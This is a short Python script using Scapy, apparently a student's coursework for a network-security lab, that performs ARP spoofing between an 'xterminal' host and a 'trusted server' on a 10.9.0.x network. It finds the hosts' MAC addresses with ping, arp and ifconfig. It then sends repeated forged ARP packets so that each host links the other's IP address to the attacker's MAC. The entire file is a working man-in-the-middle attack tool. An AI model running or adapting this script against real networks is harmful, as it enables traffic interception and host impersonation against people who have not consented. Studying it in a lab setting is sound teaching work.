# Eduardo Henrique dos Santos Cerolli
# GRR20190397

from scapy.all import *
from time import sleep
import subprocess

# Configurações de rede
attacker_ip = "10.9.0.1"
attacker_mac = ""

xterminal_ip = "10.9.0.5"
xterminal_mac = ""

trusted_server_ip = "10.9.0.6"
trusted_server_mac = ""

# envia PING para o ip informado para atualizar a tabela ARP 
def ping(ip):
    pacote = IP(dst=ip)/ICMP()
    send(pacote)

# pega o mac da maquina atual pelo ipconfig
def obter_mac_atacante():
    comando = f"ifconfig | grep -A 4 {attacker_ip} | grep 'ether' | awk '{{print $2}}'"
    processo = subprocess.run(comando, shell=True, capture_output=True, text=True)
    return processo.stdout.strip()

# pega o mac do ip passado pela tabela arp
def obter_mac(ip):
    comando = f"arp | grep {ip} | awk '{{print $3}}'"
    processo = subprocess.run(comando, shell=True, capture_output=True, text=True)
    return processo.stdout.strip()

# manda a mensagem arp para se passar pelo ip_spoof
def spoofing(ip_alvo, mac_alvo, ip_spoof, mac_atacante):
    pacote = ARP()
    pacote.op = 1
    # redirecionar esse IP para o mac atacante
    pacote.psrc = ip_spoof
    pacote.hwsrc = mac_atacante
    # o alvo é esse
    pacote.pdst = ip_alvo
    pacote.hwdst = mac_alvo
    send(pacote)

print("obtendo os endereços MAC")

attacker_mac = obter_mac_atacante()

# faz um loop ate conseguir obter os mac's usando a tabela
while (xterminal_mac == "") or (trusted_server_mac == "") :
    ping(xterminal_ip)
    ping(trusted_server_ip)
    sleep(2)
    xterminal_mac = obter_mac(xterminal_ip)
    trusted_server_mac = obter_mac(trusted_server_ip)

print("endereços MAC:")
print(attacker_mac)
print(xterminal_mac)
print(trusted_server_mac)

print("enviando o spoofing")
for x in range(10):
    spoofing(xterminal_ip, xterminal_mac, trusted_server_ip, attacker_mac)
    spoofing(trusted_server_ip, trusted_server_mac, xterminal_ip, attacker_mac)
    sleep(0.1)
